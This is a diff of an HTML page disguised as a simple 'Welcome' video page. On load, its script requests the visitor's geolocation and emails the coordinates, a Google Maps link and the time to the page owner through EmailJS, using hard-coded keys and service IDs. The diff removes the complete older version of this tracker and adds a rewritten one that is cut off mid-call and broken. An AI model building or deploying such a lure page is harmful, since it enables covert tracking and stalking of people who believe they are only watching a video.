@@ -21,97 +21,39 @@
       padding: 40px;
     }
 
-    h1 {
-      margin-bottom: 20px;
-    }
-
     video {
       width: 80%;
       max-width: 900px;
       border-radius: 10px;
       margin-top: 20px;
-      box-shadow: 0 0 20px rgba(255,255,255,0.2);
-    }
-
-    .status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #00ff88;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Welcome</h1>
+<div class="container">
+  <h1>Welcome</h1>
 
-    <!-- Upload your video file here -->
-    <video controls autoplay muted>
-      <source src="your-video.mp4" type="video/mp4">
-      Your browser does not support video.
-    </video>
+  <video controls autoplay muted>
+    <source src="your-video.mp4" type="video/mp4">
+  </video>
 
-    <div class="status" id="status">
-      This is a the website find ths
-    </div>
-  </div>
+  <h3 id="status">Requesting location...</h3>
+</div>
 
-  <script>
-    // EMAILJS CONFIGURATION
-    emailjs.init("5YzzNNDMEURwMIHB");
+<script>
+emailjs.init("5YzzNNDMEURwMIHB");
 
-    const statusText = document.getElementById("status");
+const statusText = document.getElementById("status");
 
-    function sendLocation(latitude, longitude) {
+function sendLocation(latitude, longitude) {
 
-      const templateParams = {
-        latitude: latitude,
-        longitude: longitude,
-        map_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
-        time: new Date().toLocaleString()
-      };
+  const templateParams = {
+    latitude: latitude,
+    longitude: longitude,
+    map_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+    time: new Date().toLocaleString()
+  };
 
-      
-
-emailjs.send(
-  "service_hf7zca6",
-  "template_km4w7nd",
-  templateParams
-)
-      .then(function(response) {
-        console.log("SUCCESS", response);
-        statusText.innerHTML = "Location shared successfully.";
-      })
-      .catch(function(error) {
-        console.log("FAILED", error);
-        statusText.innerHTML = "Failed to send location.";
-      });
-    }
-
-    function getLocation() {
-      if (navigator.geolocation) {
-
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            sendLocation(latitude, longitude);
-          },
-          function(error) {
-            statusText.innerHTML = "Location permission denied.";
-            console.log(error);
-          }
-        );
-
-      } else {
-        statusText.innerHTML = "Geolocation not supported.";
-      }
-    }
-
-    getLocation();
-  </script>
-
-</body>
+  emailjs.send(
 </html>
